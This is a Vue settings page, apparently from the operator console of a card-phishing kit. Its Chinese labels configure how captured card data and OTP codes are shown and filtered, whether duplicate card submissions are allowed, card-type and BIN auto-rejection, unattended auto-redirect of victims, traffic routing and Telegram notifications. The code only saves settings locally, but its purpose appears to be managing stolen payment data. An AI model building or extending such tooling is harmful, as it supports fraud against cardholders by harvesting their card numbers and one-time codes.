<script setup lang="ts">
import { ref, reactive, watch } from 'vue';

const activeTab = ref('console');

const consoleSettings = reactive({
  dataReverse: false,
  hideBinFields: false,
  hidePhoneField: false,
  onlyCardData: false,
  hideEmptyClients: false,
  customOtpTail: '',
  unattendedMode: false,
  unattendedSeconds: 3,
  allowDuplicateCard: false,
  cardTypeFilter: 'off' as 'off' | 'C' | 'D',
  autoRejectBins: '',
});

const tgSettings = reactive({
  tgBotToken: '',
  tgChatId: '',
});

const STORAGE_KEY = 'payment_console_settings';

function load() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) {
      const s = JSON.parse(raw);
      Object.assign(consoleSettings, s);
      tgSettings.tgBotToken = s.tgBotToken || '';
      tgSettings.tgChatId = s.tgChatId || '';
    }
  } catch {}
}

function save() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify({ ...consoleSettings, ...tgSettings }));
}

load();
watch([consoleSettings, tgSettings], save, { deep: true });
</script>

<template>
  <div class="settings-page">
    <NTabs v-model:value="activeTab" type="line">
      <NTabPane name="console" tab="后台设置">
        <NSpace vertical :size="8" class="section-pad">
          <div class="section"><h4>数据展示</h4>
            <NSpace vertical :size="4">
              <NCheckbox v-model:checked="consoleSettings.dataReverse">数据倒序排列</NCheckbox>
              <NCheckbox v-model:checked="consoleSettings.hideBinFields">隐藏卡级/卡银行等 BIN 信息</NCheckbox>
              <NCheckbox v-model:checked="consoleSettings.hidePhoneField">隐藏电话栏</NCheckbox>
            </NSpace>
          </div>
          <div class="section"><h4>过滤设置</h4>
            <NSpace vertical :size="4">
              <NCheckbox v-model:checked="consoleSettings.onlyCardData">只显示填卡数据</NCheckbox>
              <NCheckbox v-model:checked="consoleSettings.hideEmptyClients">隐藏无数据客户端</NCheckbox>
            </NSpace>
            <div class="field-row">
              <label>OTP 验证码手机尾号</label>
              <NInput v-model:value="consoleSettings.customOtpTail" placeholder="输入手机尾号" maxlength="6" size="small" />
            </div>
          </div>
          <div class="section"><h4>功能设置</h4>
            <NSpace vertical :size="4">
              <NCheckbox v-model:checked="consoleSettings.unattendedMode">无人值守（{{ consoleSettings.unattendedSeconds }}s 后自动跳转完成）</NCheckbox>
              <NCheckbox v-model:checked="consoleSettings.allowDuplicateCard">允许重复卡号提交</NCheckbox>
            </NSpace>
            <div class="field-row">
              <label>按卡类型筛选</label>
              <NSelect v-model:value="consoleSettings.cardTypeFilter" :options="[{ label: '关闭', value: 'off' },{ label: '只要 C 卡', value: 'C' },{ label: '只要 D 卡', value: 'D' }]" size="small" />
            </div>
          </div>
        </NSpace>
      </NTabPane>

      <NTabPane name="routing" tab="分流控制">
        <div class="placeholder">分流控制 — 页面内容待添加</div>
      </NTabPane>

      <NTabPane name="bin" tab="卡头设置">
        <div class="section"><h4>自动拒绝的卡头（6位，逗号分隔）</h4>
          <NInput v-model:value="consoleSettings.autoRejectBins" placeholder="457362,521300" size="small" style="max-width:400px" />
        </div>
      </NTabPane>

      <NTabPane name="tg" tab="Telegram 通知">
        <NSpace vertical :size="12" style="max-width:400px">
          <div class="field-row">
            <label>Bot Token</label>
            <NInput v-model:value="tgSettings.tgBotToken" placeholder="123456:ABC-DEF..." size="small" />
          </div>
          <div class="field-row">
            <label>Chat ID（群组负数）</label>
            <NInput v-model:value="tgSettings.tgChatId" placeholder="-5279672058" size="small" />
          </div>
        </NSpace>
      </NTabPane>
    </NTabs>
  </div>
</template>

<style scoped>
.settings-page { padding: 16px; max-width: 600px; }
.section { padding: 12px 0; border-bottom: 1px solid var(--n-border-color); }
.section h4 { font-size: 13px; color: #18d46b; margin-bottom: 10px; }
.field-row { margin-top: 10px; }
.field-row label { font-size: 12px; color: var(--n-text-color-3); margin-bottom: 4px; display: block; }
.placeholder { padding: 40px 0; text-align: center; color: var(--n-text-color-3); }
.section-pad { padding-top: 8px; }
</style>
